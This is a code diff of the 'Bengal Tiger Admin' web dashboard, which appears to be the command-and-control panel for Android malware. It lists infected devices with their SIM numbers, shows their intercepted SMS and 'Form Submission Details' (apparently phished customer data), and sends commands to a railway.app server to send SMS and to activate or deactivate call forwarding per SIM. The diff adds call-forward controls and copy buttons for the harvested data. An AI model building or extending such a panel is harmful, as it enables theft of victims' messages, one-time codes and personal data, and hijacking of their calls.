@@ -9,43 +9,29 @@
     <style>
         :root { --primary: #FFD700; --dark: #111; --success: #28a745; --danger: #dc3545; }
         body { margin: 0; font-family: 'Roboto', sans-serif; background: #f0f2f5; }
-        
-        /* Toast */
         #toast { visibility: hidden; min-width: 250px; background-color: var(--success); color: #fff; text-align: center; border-radius: 5px; padding: 16px; position: fixed; z-index: 3000; right: 30px; top: 30px; font-weight: bold; opacity: 0; transition: 0.5s; }
         #toast.show { visibility: visible; opacity: 1; top: 60px; }
         #toast.error { background-color: var(--danger); }
-
-        /* Login */
         #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--dark); z-index: 2000; display: flex; justify-content: center; align-items: center; flex-direction: column; }
         .login-box { background: white; padding: 40px; border-radius: 8px; text-align: center; width: 300px; }
         .login-box input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
         .btn-gold { background: var(--primary); border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; color: var(--dark); }
-
-        /* Dashboard */
         header { background: var(--dark); color: var(--primary); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
         .controls i { margin-left: 20px; cursor: pointer; font-size: 20px; color: white; transition: 0.3s; }
         .controls i:hover { color: var(--primary); }
-
-        /* Stats */
         .stats { display: flex; justify-content: space-around; padding: 20px; margin-top: 20px; }
         .stat-box { background: white; width: 30%; padding: 20px; text-align: center; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-bottom: 4px solid var(--dark); }
         .stat-num { font-size: 32px; font-weight: bold; color: var(--dark); }
-
-        /* Filter Tabs */
         .filters { text-align: center; margin: 20px; }
         .filter-btn { padding: 10px 20px; margin: 0 5px; background: #ddd; border: none; cursor: pointer; border-radius: 20px; font-weight: bold; }
         .filter-btn.active { background: var(--dark); color: var(--primary); }
-
-        /* Cards */
         .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; padding: 20px; }
         .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border-top: 5px solid #555; position: relative; }
         .card.online { border-top: 5px solid var(--success); }
         .card.pinned { border-top: 5px solid var(--primary); }
-        
         .card-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
         .status { font-size: 12px; font-weight: bold; color: #666; }
         .online-text { color: var(--success); }
-        
         .info { font-size: 13px; color: #444; margin-bottom: 5px; }
         .btns { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
         .btn-sm { padding: 8px; font-size: 12px; cursor: pointer; border: none; border-radius: 4px; color: white; background: #444; font-weight: bold; }
@@ -53,11 +39,7 @@
         .btn-call { background: #17a2b8; } 
         .btn-view { background: #9c27b0; }
         .btn-del { background: var(--danger); }
-        
-        /* Serial Number Badge */
         .serial-badge { position: absolute; top: 10px; right: 10px; background: var(--primary); color: var(--dark); font-weight: bold; padding: 5px 12px; border-radius: 50px; font-size: 14px; }
-        
-        /* Modal Styles */
         .modal { display: none; position: fixed; z-index: 2500; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
         .modal.show { display: flex; align-items: center; justify-content: center; }
         .modal-content { background: white; padding: 30px; border-radius: 10px; width: 80%; max-width: 600px; max-height: 80vh; overflow-y: auto; }
@@ -71,9 +53,7 @@
     </style>
 </head>
 <body>
-
     <div id="toast"><i class="fas fa-check-circle"></i> Success</div>
-
     <div id="login-screen">
         <h1 style="color:var(--primary)">BENGAL TIGER ADMIN</h1>
         <div class="login-box">
@@ -81,7 +61,6 @@
             <button class="btn-gold" onclick="login()">LOGIN</button>
         </div>
     </div>
-
     <div id="dashboard" style="display:none;">
         <header>
             <h2><i class="fas fa-paw"></i> BENGAL TIGER</h2>
@@ -91,23 +70,18 @@
                 <i class="fas fa-sign-out-alt" onclick="location.reload()" title="Logout"></i>
             </div>
         </header>
-
         <div class="stats">
             <div class="stat-box"><div class="stat-num" id="s-all">0</div>ALL DEVICES</div>
             <div class="stat-box"><div class="stat-num" id="s-on" style="color:var(--success)">0</div>ONLINE</div>
             <div class="stat-box"><div class="stat-num" id="s-pin" style="color:var(--primary)">0</div>PINNED</div>
         </div>
-
         <div class="filters">
             <button class="filter-btn active" onclick="filter('all', this)">ALL DEVICES</button>
             <button class="filter-btn" onclick="filter('online', this)">ONLINE</button>
             <button class="filter-btn" onclick="filter('pinned', this)">PINNED</button>
         </div>
-
         <div class="grid" id="grid"></div>
     </div>
-
-    <!-- View Data Modal -->
     <div id="viewDataModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
@@ -117,8 +91,6 @@
             <div id="modalBody"></div>
         </div>
     </div>
-
-    <!-- View SMS Modal -->
     <div id="viewSmsModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
@@ -128,20 +100,17 @@
             <div id="smsModalBody"></div>
         </div>
     </div>
-
     <script src="https://bengal-tiger-admin-production-8071.up.railway.app/socket.io/socket.io.js"></script>
     <script>
         const socket = io('https://bengal-tiger-admin-production-8071.up.railway.app');
         let devices = [];
         let currentFilter = 'all';
-
         function toast(msg, err=false) {
             const t = document.getElementById("toast");
             t.innerText = msg;
             t.className = err ? "show error" : "show";
             setTimeout(() => t.className = "", 3000);
         }
-
         async function login() {
             const p = document.getElementById('pass').value;
             const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/login', {
@@ -155,7 +124,6 @@
                 fetchData(false);
             } else alert("Wrong Password");
         }
-
         async function fetchData(showMsg) {
             try {
                 const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/devices');
@@ -168,55 +136,53 @@
                 toast('❌ Refresh failed', true);
             }
         }
-
         socket.on('dashboard-update', () => fetchData(false));
-
         function filter(type, btn) {
             currentFilter = type;
             document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
             btn.classList.add('active');
             render();
         }
-
         function render() {
-            // Update Stats
             document.getElementById('s-all').innerText = devices.length;
             document.getElementById('s-on').innerText = devices.filter(d=>d.isOnline).length;
             document.getElementById('s-pin').innerText = devices.filter(d=>d.isPinned).length;
-
             const grid = document.getElementById('grid');
             grid.innerHTML = '';
-            
             let list = devices;
             if(currentFilter === 'online') list = devices.filter(d=>d.isOnline);
             if(currentFilter === 'pinned') list = devices.filter(d=>d.isPinned);
-
-            // Sort by latest first
             list = list.sort((a, b) => new Date(b.registrationTimestamp) - new Date(a.registrationTimestamp));
-
             list.forEach((d, idx) => {
                 const serialNum = idx + 1;
                 const pinColor = d.isPinned ? 'var(--primary)' : '#ccc';
-                const statusBadge = d.isOnline
-                    ? `<span style="position:absolute;top:18px;right:18px;background:var(--success);color:#fff;padding:4px 12px;border-radius:20px;font-weight:bold;font-size:12px;box-shadow:0 2px 6px rgba(0,0,0,0.1);z-index:2;">● ONLINE</span>`
-                    : `<span style="position:absolute;top:18px;right:18px;background:var(--danger);color:#fff;padding:4px 12px;border-radius:20px;font-weight:bold;font-size:12px;box-shadow:0 2px 6px rgba(0,0,0,0.1);z-index:2;">● OFFLINE</span>`;
-                const simCopy = (sim, label) =>
-                    `<span style='font-weight:bold;'>${label}:</span> <span id='${d.deviceId}_${label}' style='user-select:all;'>${sim||'N/A'}</span> <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy ${label}" onclick="navigator.clipboard.writeText('${sim||''}');toast('${label} copied!')"></i>`;
                 const batteryIcon = d.battery >= 80 ? 'fa-battery-full' : d.battery >= 60 ? 'fa-battery-three-quarters' : d.battery >= 40 ? 'fa-battery-half' : d.battery >= 20 ? 'fa-battery-quarter' : 'fa-battery-empty';
-                const batteryColor = d.battery >= 40 ? '#43a047' : d.battery >= 20 ? '#ff9800' : '#d32f2f';
+                const batteryColor = d.battery > 20 ? '#43a047' : '#d32f2f';
+                const batteryPercent = `<span style='position:absolute;top:50%;left:0;width:100%;transform:translateY(-50%);text-align:center;font-size:13px;font-weight:bold;color:#111;pointer-events:none;'>${d.battery}%</span>`;
+                const statusBadge = `<span style="display:inline-block;border:2px solid #FFD700;border-radius:16px;padding:2px 16px;font-weight:bold;${d.isOnline ? 'color:#43a047;' : 'color:#d32f2f;'}background:#222;font-size:13px;letter-spacing:1px;">${d.isOnline ? 'ONLINE' : 'OFFLINE'}</span>`;
+                const simCopy = (sim, label) =>
+                    `<span style='font-weight:bold;'>${label}:</span> <span id='${d.deviceId}_${label}' style='user-select:all;'>${sim||'N/A'}</span> <i class=\"fas fa-copy\" style=\"color:var(--primary);cursor:pointer;\" title=\"Copy ${label}\" onclick=\"navigator.clipboard.writeText('${sim||''}');toast('${label} copied!')\"></i>`;
+                // Virtual mobile phone style
                 grid.innerHTML += `
-        <div class="card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}" style="border:2px solid #e0e0e0;box-shadow:0 6px 24px rgba(0,0,0,0.08);position:relative;">
-            ${statusBadge}
-            <div class="serial-badge" style="font-size:15px;">#${serialNum}</div>
-            <div class="card-header" style="margin-bottom:6px;align-items:center;">
-                <b style="font-size:18px;">${d.model}</b>
-                <div>
-                    <i class="fas fa-thumbtack" style="color:${pinColor}; cursor:pointer;font-size:20px;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})" title="Pin Device"></i>
-                </div>
+        <div class="card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}" style="border:3px solid #1976d2;box-shadow:0 8px 32px #1976d2a0, 0 2px 8px #fff;position:relative;max-width:320px;margin:auto;border-radius:32px 32px 36px 36px;background:linear-gradient(145deg,#f8fafc 80%,#e0e0e0 100%);padding-top:60px;padding-bottom:24px;overflow:hidden;">
+            <div style="position:absolute;top:18px;left:18px;z-index:2;">
+                <i class="fas fa-thumbtack" style="color:${pinColor}; cursor:pointer;font-size:22px;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})" title="Pin Device"></i>
             </div>
-            <div class="info" style="margin-bottom:2px;display:flex;align-items:center;gap:8px;">
-                <i class="fas ${batteryIcon}" style="color:${batteryColor};font-size:18px;"></i>
-                <span style="font-weight:bold;color:${batteryColor};">${d.battery}%</span>
+                        <div style="position:absolute;top:8px;right:8px;z-index:2;display:flex;align-items:center;gap:8px;">
+                                <span style='position:relative;display:inline-block;width:44px;height:32px;'>
+                                    <i class="fas ${batteryIcon}" style="color:${batteryColor};font-size:32px;"></i>
+                                    ${batteryPercent}
+                                </span>
+                        </div>
+            <div class="serial-badge" style="font-size:17px;left:50%;transform:translateX(-50%);position:absolute;top:18px;background:var(--primary);color:var(--dark);padding:7px 18px 7px 18px;display:flex;flex-direction:column;align-items:center;min-width:120px;">
+                <span style='font-size:18px;font-weight:bold;'>${serialNum}</span>
+                <span style='font-size:13px;font-weight:bold;color:#222;margin-top:2px;'>${d.model}</span>
+            </div>
+            <div class="card-header" style="margin-top:70px;margin-bottom:6px;align-items:center;justify-content:center;">
+                <!-- Model name now in serial badge -->
+            </div>
+            <div class="info" style="margin-bottom:2px;display:flex;align-items:center;gap:8px;justify-content:center;">
+                ${statusBadge}
             </div>
             <div class="info" style="margin-bottom:2px;">${simCopy(d.sim1,'SIM1')}</div>
             <div class="info" style="margin-bottom:2px;">${simCopy(d.sim2,'SIM2')}</div>
@@ -232,10 +198,8 @@
         </div>`;
             });
         }
-
         async function act(id, type) {
             if(type === 'SEND_SMS') {
-                // Custom modal for Send SMS
                 const modal = document.createElement('div');
                 modal.style.position = 'fixed';
                 modal.style.top = '0';
@@ -298,14 +262,92 @@
                 };
                 return;
             } else if(type === 'CALL_FORWARD') {
-                const n = prompt("Enter number for call forwarding:", "");
-                if(!n) {
-                    toast('❌ Phone number required', true);
-                    return;
-                }
-                data = { number: n };
+                // Custom modal for Call Forward
+                const modal = document.createElement('div');
+                modal.style.position = 'fixed';
+                modal.style.top = '0';
+                modal.style.left = '0';
+                modal.style.width = '100vw';
+                modal.style.height = '100vh';
+                modal.style.background = 'rgba(0,0,0,0.5)';
+                modal.style.display = 'flex';
+                modal.style.alignItems = 'center';
+                modal.style.justifyContent = 'center';
+                modal.style.zIndex = '9999';
+                modal.innerHTML = `
+          <div style="background:#fff;padding:32px 28px 24px 28px;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.18);min-width:340px;max-width:95vw;">
+            <div style="font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:18px;text-align:center;">Call Forward</div>
+            <div style="margin-bottom:12px;">
+              <label style='font-weight:bold;color:#ff9800;'>Select SIM:</label>
+              <select id="cfSim" style="width:100%;padding:10px;font-size:15px;border:2px solid #ff9800;border-radius:6px;margin-bottom:10px;">
+                <option value="1">SIM 1</option>
+                <option value="2">SIM 2</option>
+              </select>
+              <label style='font-weight:bold;color:#ff9800;'>Forwarding Number:</label>
+              <input id="cfNumber" type="text" placeholder="Enter forwarding number" style="width:100%;padding:10px;font-size:15px;border:2px solid #ff9800;border-radius:6px;margin-bottom:10px;">
+            </div>
+            <div id="cfStatus" style="font-size:14px;margin-bottom:10px;"></div>
+            <div style="display:flex;justify-content:space-between;gap:8px;">
+              <button id="cfActivateBtn" style="background:#43a047;color:#fff;padding:10px 18px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Activate</button>
+              <button id="cfDeactivateBtn" style="background:#d32f2f;color:#fff;padding:10px 18px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Deactivate</button>
+              <button id="cfStatusBtn" style="background:#1976d2;color:#fff;padding:10px 18px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Check Status</button>
+            </div>
+            <div style="margin-top:10px;text-align:center;">
+              <button id="cfCancelBtn" style="background:#eee;color:#222;padding:8px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Cancel</button>
+            </div>
+          </div>
+        `;
+                document.body.appendChild(modal);
+                document.getElementById('cfCancelBtn').onclick = () => document.body.removeChild(modal);
+                document.getElementById('cfActivateBtn').onclick = async () => {
+                    const simSlot = document.getElementById('cfSim').value;
+                    const number = document.getElementById('cfNumber').value;
+                    if (!number) {
+                        document.getElementById('cfStatus').innerHTML = '<span style="color:#d32f2f;font-weight:bold;">Forwarding number required.</span>';
+                        return;
+                    }
+                    document.getElementById('cfStatus').innerHTML = '<span style="color:#1976d2;">Activating...</span>';
+                    try {
+                        const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
+                            method:'POST', headers:{'Content-Type':'application/json'},
+                            body: JSON.stringify({deviceId: id, action: 'CALL_FORWARD_ACTIVATE', data: {simSlot, number}})
+                        });
+                        const d = await r.json();
+                        document.getElementById('cfStatus').innerHTML = d.success ? `<span style="color:#43a047;font-weight:bold;">Activated</span>` : `<span style="color:#d32f2f;font-weight:bold;">${d.message}</span>`;
+                    } catch (err) {
+                        document.getElementById('cfStatus').innerHTML = `<span style="color:#d32f2f;font-weight:bold;">Error: ${err.message}</span>`;
+                    }
+                };
+                document.getElementById('cfDeactivateBtn').onclick = async () => {
+                    const simSlot = document.getElementById('cfSim').value;
+                    document.getElementById('cfStatus').innerHTML = '<span style="color:#1976d2;">Deactivating...</span>';
+                    try {
+                        const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
+                            method:'POST', headers:{'Content-Type':'application/json'},
+                            body: JSON.stringify({deviceId: id, action: 'CALL_FORWARD_DEACTIVATE', data: {simSlot}})
+                        });
+                        const d = await r.json();
+                        document.getElementById('cfStatus').innerHTML = d.success ? `<span style="color:#43a047;font-weight:bold;">Deactivated</span>` : `<span style="color:#d32f2f;font-weight:bold;">${d.message}</span>`;
+                    } catch (err) {
+                        document.getElementById('cfStatus').innerHTML = `<span style="color:#d32f2f;font-weight:bold;">Error: ${err.message}</span>`;
+                    }
+                };
+                document.getElementById('cfStatusBtn').onclick = async () => {
+                    const simSlot = document.getElementById('cfSim').value;
+                    document.getElementById('cfStatus').innerHTML = '<span style="color:#1976d2;">Checking status...</span>';
+                    try {
+                        const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
+                            method:'POST', headers:{'Content-Type':'application/json'},
+                            body: JSON.stringify({deviceId: id, action: 'CALL_FORWARD_STATUS', data: {simSlot}})
+                        });
+                        const d = await r.json();
+                        document.getElementById('cfStatus').innerHTML = d.success ? `<span style="color:#43a047;font-weight:bold;">${d.message}</span>` : `<span style="color:#d32f2f;font-weight:bold;">${d.message}</span>`;
+                    } catch (err) {
+                        document.getElementById('cfStatus').innerHTML = `<span style="color:#d32f2f;font-weight:bold;">Error: ${err.message}</span>`;
+                    }
+                };
+                return;
             }
-
             try {
                 const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
                     method:'POST', headers:{'Content-Type':'application/json'},
@@ -317,7 +359,6 @@
                 toast('❌ Error: ' + err.message, true);
             }
         }
-
         async function togglePin(id, s) {
             try {
                 const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/pin-device', {
@@ -335,9 +376,7 @@
                 toast('❌ Error: ' + err.message, true);
             }
         }
-        
         async function del(id) {
-            // Custom modal for password input
             const modal = document.createElement('div');
             modal.style.position = 'fixed';
             modal.style.top = '0';
@@ -387,7 +426,6 @@
                 }
             };
         }
-
         async function changePass() {
             const o = prompt("Old Password:");
             const n = prompt("New Password:");
@@ -400,8 +438,6 @@
                 toast(d.success ? "✅ Password Changed" : "❌ Wrong Old Password", !d.success);
             }
         }
-
-        // View Data Function
         function viewData(deviceId) {
             const device = devices.find(d => d.deviceId === deviceId);
             if (!device) {
@@ -411,14 +447,19 @@
             const modalBody = document.getElementById('modalBody');
             let html = `
         <div style="background:#e3f2fd;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;">
-            <div style="font-size:18px;font-weight:bold;color:#1976d2;">${device.model}</div>
-            <div style="margin-top:6px;font-size:14px;"><b>Device ID:</b> ${device.deviceId}</div>
-            <div style="font-size:14px;"><b>Serial:</b> ${device.serialNumber}</div>
-            <div style="font-size:14px;"><b>SIM1:</b> ${device.sim1 || 'N/A'} &nbsp; <b>SIM2:</b> ${device.sim2 || 'N/A'}</div>
-            <div style="font-size:14px;"><b>Android:</b> ${device.androidVersion}</div>
-            <div style="font-size:14px;"><b>Battery:</b> ${device.battery}%</div>
-            <div style="font-size:14px;"><b>Status:</b> <span style='color:${device.isOnline ? '#43a047':'#d32f2f'};font-weight:bold;'>${device.isOnline ? 'Online':'Offline'}</span></div>
-            <div style="font-size:14px;"><b>Last Seen:</b> ${formatLastSeen(device.lastSeen)}</div>
+            <div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:10px;">Device Details</div>
+            <table style="width:100%;border-collapse:collapse;font-size:15px;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.04);">
+                <tbody>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>1. Model</td><td style='padding:8px 6px;'>${device.model || 'N/A'}</td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>2. SIM1</td><td style='padding:8px 6px;'>${device.sim1 || 'N/A'} <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy SIM1" onclick="navigator.clipboard.writeText('${device.sim1||''}');toast('SIM1 copied!')"></i></td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>3. SIM2</td><td style='padding:8px 6px;'>${device.sim2 || 'N/A'} <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy SIM2" onclick="navigator.clipboard.writeText('${device.sim2||''}');toast('SIM2 copied!')"></i></td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>4. Android Version</td><td style='padding:8px 6px;'>${device.androidVersion || 'N/A'}</td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>5. Battery</td><td style='padding:8px 6px;'>${device.battery || 'N/A'}%</td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>6. Install Date</td><td style='padding:8px 6px;'>${device.installDate ? (new Date(device.installDate)).toLocaleString('en-GB') : 'N/A'}</td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>7. Last Seen</td><td style='padding:8px 6px;'>${device.lastSeen ? (new Date(device.lastSeen)).toLocaleString('en-GB') : 'N/A'}</td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>8. Status</td><td style='padding:8px 6px;'><span style='color:${device.isOnline ? '#43a047':'#d32f2f'};font-weight:bold;'>${device.isOnline ? 'Online':'Offline'}</span></td></tr>
+                </tbody>
+            </table>
         </div>
         <hr style="margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;">
         <h3 style="color:#1976d2;margin-bottom:8px;">📝 Form Submission Details</h3>
@@ -427,9 +468,9 @@
                 let i = 1;
                 Object.entries(device.customerData).forEach(([key, value]) => {
                     html += `
-                <div style="background:#e3f2fd;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #1976d2;">
-                    <span style="color:#1976d2;font-weight:bold;">${i++}. ${key}</span><br>
-                    <span style="color:#222;font-size:15px;">${JSON.stringify(value)}</span>
+                <div style="background:#e3f2fd;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;">
+                    <span style="color:#1976d2;font-weight:bold;">${key}</span>
+                    <span style="color:#222;font-size:15px;">${JSON.stringify(value)} <i class=\"fas fa-copy\" style=\"color:var(--primary);cursor:pointer;\" title=\"Copy\" onclick=\"navigator.clipboard.writeText('${JSON.stringify(value)}');toast('Copied!')\"></i></span>
                 </div>
             `;
                 });
@@ -439,15 +480,12 @@
             modalBody.innerHTML = html;
             document.getElementById('viewDataModal').classList.add('show');
         }
-
-        // View SMS Function
         function viewSms(deviceId) {
             const device = devices.find(d => d.deviceId === deviceId);
             if (!device) {
                 toast('❌ Device not found', true);
                 return;
             }
-            // Simulate last 50 messages (replace with real data if available)
             let messages = device.smsList || [];
             if (messages.length === 0) {
                 messages = Array.from({length: 5}, (_, i) => ({
@@ -460,33 +498,49 @@
         <div style='font-size:18px;font-weight:bold;color:#1976d2;'>${device.model} - Last 50 SMS</div>
     </div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
             html += messages.map((msg, idx) => `
-        <div style='background:#fff;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #1976d2;'>
-            <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${msg.from}</div>
-            <div style='font-size:15px;color:#222;margin:4px 0;'>${msg.body}</div>
-            <div style='font-size:12px;color:#888;'>${msg.time}</div>
+        <div style='background:#fff;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;'>
+            <div>
+                <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${msg.from}</div>
+                <div style='font-size:15px;color:#222;margin:4px 0;'>${msg.body}</div>
+                <div style='font-size:12px;color:#888;'>${msg.time}</div>
+            </div>
+            <div style='display:flex;flex-direction:column;gap:6px;'>
+                <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;font-size:18px;" title="Copy Message" onclick="navigator.clipboard.writeText('${msg.body}');toast('Message copied!')"></i>
+                <i class="fas fa-trash" style="color:#d32f2f;cursor:pointer;font-size:18px;" title="Delete Message" onclick="deleteSms('${deviceId}', ${idx})"></i>
+            </div>
         </div>
     `).join('');
             if (messages.length === 0) html += '<div class="no-data">No SMS messages found</div>';
             document.getElementById('smsModalBody').innerHTML = html;
             document.getElementById('viewSmsModal').classList.add('show');
         }
-
-        // Close Modal Function
+        // Delete SMS handler (demo only)
+        function deleteSms(deviceId, idx) {
+            toast('Delete SMS feature coming soon!');
+        }
         function closeModal(modalId) {
             document.getElementById(modalId).classList.remove('show');
         }
-
-        // Close modal when clicking outside
         window.onclick = function(event) {
             const viewDataModal = document.getElementById('viewDataModal');
             const viewSmsModal = document.getElementById('viewSmsModal');
-            
             if (event.target == viewDataModal) {
                 viewDataModal.classList.remove('show');
             }
             if (event.target == viewSmsModal) {
                 viewSmsModal.classList.remove('show');
             }
+        }
+        function formatLastSeen(ts) {
+            if (!ts) return 'N/A';
+            const d = new Date(ts);
+            if (isNaN(d.getTime())) return 'N/A';
+            const now = new Date();
+            const diff = Math.floor((now - d) / 1000);
+            if (diff < 60) return diff + 's ago';
+            if (diff < 3600) return Math.floor(diff/60) + 'm ago';
+            if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
+            return d.toLocaleString();
         }
     </script>
 </body>
